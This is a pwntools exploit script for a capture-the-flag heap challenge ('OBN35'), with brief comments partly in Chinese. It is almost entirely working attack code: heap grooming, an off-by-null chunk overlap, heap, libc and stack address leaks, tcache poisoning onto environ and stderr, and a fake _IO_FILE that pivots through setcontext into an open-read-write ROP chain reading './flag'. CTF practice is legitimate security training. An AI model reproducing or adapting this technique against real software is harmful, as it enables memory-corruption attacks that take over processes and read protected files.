#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
#context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./OBN35')
libc = ELF('./libc.so.6')
elf = ELF('./OBN35')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(length,content='A'):
	p.sendlineafter(':','1')
	p.sendlineafter('len:',str(length))
	p.sendafter('please input content:',content)

def delete(idx):
	p.sendlineafter(':','2')
	p.sendlineafter('idx:',str(idx))

def edit(idx,ct):
	p.sendlineafter(':','3')
	p.sendlineafter('idx:',str(idx))
	p.send(ct)

def show(idx):
	p.sendlineafter(':','4')
	p.sendlineafter('idx:',str(idx))

# step1 P&0xff = 0

add(0x418) #0 A = P->fd
add(0x108) #1 barrier 可自由调整 barrier 大小，使 C0最后一个字节为 00 即可.
add(0x438) #2 B0 helper
add(0x438) #3 C0 = P , P&0xff = 0
add(0x108) #4 barrier
add(0x488) #5 H0 helper for write bk->fd vitcim chunk.
add(0x428) #6 D = P->bk
add(0x108) #7 barrier
add(0x108) #8 barrier
add(0x108) #9 barrier
add(0x108) #10 barrier

# =============================================
# step 2 use unsortedbin to set p->fd = A , p->bk = D

delete(0) # A
delete(3) # C0
delete(6) # D

# unsortedbin: D-C0-A   C0->FD = A
delete(2) # merge B0 with C0. preserve p->fd p->bk
add(0x458,'\x00' * 0x438 + p64(0x551)[:-2])  #9 put A,D into largebin, split BC. use B1 to set p->size = 0x551

# recovery
add(0x418) #12 C1 from ub
add(0x428) #13 bk  D from largebin
add(0x418) #14 fd  A from largebin

# =============================================
# step3 use unsortedbin to set fd->bk, partial overwrite fd->bk

delete(14) # A = P->fd
delete(12)  # C1
# unsortedbin: C1-A ,   A->BK = C1

add(0x418)  #15 A
edit(15, 'a' * 8) # partial \x00 overwrite bk  A->bk = p
add(0x418) #16

#=========================heapbase=============================

show(15)
heapbase = u64(p.recv(16)[-8:].ljust(8, "\x00")) - 0xc00
pr('heapbase',heapbase)

# =============================================
# step4 use ub to set bk->fd

delete(16) # C1
delete(13) # D = P->bk
# ub-D-C1    D->FD = C1
delete(5)  # merge D with H, preserve D->fd
add(0x500 - 8) #17 H1. bk->fd = p, partial write \x00
edit(17,'\x00'*0x488 + p64(0x431))
add(0x3b0) #18 recovery

# =============================================
# step5 off by null

edit(4, 0x100*'\x00' + p64(0x550)) # off by null, set fake_prev_size = 0x550, prev inuse=0
delete(17) # merge H1 with C0. trigger overlap C0,4,6

#=========================libcbase=============================

add(0x438) #19 put libc to chunk 4

show(4) # unsortedbin
libcbase = u64(p.recv(6).ljust(8, "\x00"))- 0x219ce0 # unsortedbin 与 libc 偏移 == 0x219ce0
pr('libcbase',libcbase)

#==============================================================

syscall_ret = libcbase + libc.search(asm('syscall\nret')).next()
_IO_wfile_jumps = libcbase + libc.sym['_IO_wfile_jumps']
setcontext_door = libcbase + libc.sym['setcontext'] + 61
environ_addr = libcbase + libc.sym['__environ']
bss_addr = libcbase + libc.bss()
prdx_ret = libcbase + 0x11f497 # pop rdx ; pop r12 ; ret
prdi_ret = libcbase + 0x2a3e5  # pop rdi ; ret
prsi_ret = libcbase + 0x2be51  # pop rsi ; ret
prax_ret = libcbase + 0x45eb0  # pop rax ; ret
ret = prdi_ret + 1 # ret

#==========================stack===============================

delete(19) # consolidate
add(0x458, 0x438*'\x00' + p64(0x111)) # 20fix size for chunk 4. 6 overlap 4
delete(7) # tcachebin
delete(4) # tcachebin
environ = ((heapbase + 0x1050) >> 12) ^ (environ_addr - 0x10)
edit(20, 0x438*'\x00' + p64(0x111) + p64(environ)) # set chunk4->fd = environ
add(0x100, p64(environ)) #21
add(0x100, '\x00'*0x10) #22 分配至 environ 

show(22)
stack = u64(p.recv(24)[-8:].ljust(8,'\x00')) # 泄露 environ 栈地址
_start_point = stack - 0x50 # 程序 _start_point 地址
_start_point = _start_point - 0x8 # 0x10 对齐
pr('_start_point',_start_point)

#=======================_start_point===========================

delete(8)  # tcachebin
delete(21) # tcachebin
_start_point = ((heapbase + 0x1050) >> 12) ^ _start_point
edit(20, 0x438*'\x00' + p64(0x111) + p64(_start_point)) # set chunk4->fd = _start_point
add(0x100, p64(_start_point)) #23
add(0x100) #24 分配至 _start_point

show(24)
temp = u64(p.recv(48)[-8:].ljust(8,'\x00'))
start = temp & 0xfffffffff000 # 低三位清零

#==========================stderr==============================

stderr = start + 0x3040 # stderr bss 地址
pr('stderr',stderr)
delete(9)  # tcachebin
delete(23) # tcachebin
stderr = ((heapbase + 0x1050) >> 12) ^ stderr
edit(20, 0x438*'\x00' + p64(0x111) + p64(stderr)) # set chunk4->fd = stderr
add(0x100, p64(stderr)) #25
add(0x100, p64(heapbase + 0x290)) #26 stderr point fake_IO_FILE

#==========================top_size============================

delete(10) # tcachebin
delete(25) # tcachebin
top_size_addr = heapbase + 0x1e50
top_size = ((heapbase + 0x1050) >> 12) ^ top_size_addr
edit(20, 0x438*'\x00' + p64(0x111) + p64(top_size)) # set chunk4->fd = top_size_addr
add(0x100, p64(top_size)) #27
add(0x100, p64(0) + p64(0x501)) #28 change top_chunk size

edit(20, '\x00'*0x18 + p64(0x421)) # fix C1 size

#======================fake_IO_FILE============================

context_addr  = heapbase + 0x1660
IO_FILE_addr  = heapbase + 0x290

fake_IO_FILE  = p64(0) # _IO_read_end
fake_IO_FILE += p64(0) # _IO_read_base
fake_IO_FILE += p64(0) # _IO_write_base
fake_IO_FILE += p64(0) # _IO_write_ptr
fake_IO_FILE += p64(0) # _IO_write_end
fake_IO_FILE += p64(0) # _IO_buf_base
fake_IO_FILE += p64(1) + p64(0) # _IO_buf_base != _IO_buf_end
fake_IO_FILE += p64(context_addr) # rdx-> context_addr
fake_IO_FILE += p64(setcontext_door) # _IO_save_end = call(setcontext + 61)
fake_IO_FILE  = fake_IO_FILE.ljust(0x58, '\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE  = fake_IO_FILE.ljust(0x78, '\x00')
fake_IO_FILE += p64(heapbase + 0x200)  # _lock = writable address
fake_IO_FILE  = fake_IO_FILE.ljust(0x90, '\x00')
fake_IO_FILE += p64(IO_FILE_addr + 0x30) # _wide_data = rax1
fake_IO_FILE  = fake_IO_FILE.ljust(0xb0, '\x00')
fake_IO_FILE += p64(0)  # _mode = 0
fake_IO_FILE  = fake_IO_FILE.ljust(0xc8, '\x00')
fake_IO_FILE += p64(_IO_wfile_jumps + 0x10) # vtable = _IO_wfile_xsputn + 0x10 = _IO_wfile_seekoff
fake_IO_FILE += p64(0)*6
fake_IO_FILE += p64(IO_FILE_addr + 0x40)  # rax2

#=============================orw==============================

frame = SigreturnFrame()
frame.rsp  = context_addr + 0x100 # rsp->orw
frame.rip  = ret

payload  = str(frame)
payload  = payload.ljust(0x100,'\x00')
flag_addr = context_addr + 0x200

# ORW
# open
payload += p64(prdi_ret) + p64(flag_addr) 
payload += p64(prsi_ret) + p64(0)
payload += p64(prax_ret) + p64(2)
payload += p64(syscall_ret)

# read
payload += p64(prdi_ret) + p64(3)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret ) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(0)
payload += p64(syscall_ret)

# write
payload += p64(prdi_ret) + p64(1)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret ) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(1)
payload += p64(syscall_ret)

payload  = payload.ljust(0x200,'\x00') + './flag\x00\x00'

#==============================================================

edit(15, fake_IO_FILE)
edit(18, payload)

#gdb.attach(p)
#pause()

p.sendlineafter(':','1')
p.sendlineafter('len:',str(0x600)) # 触发 __malloc_assert
p.interactive()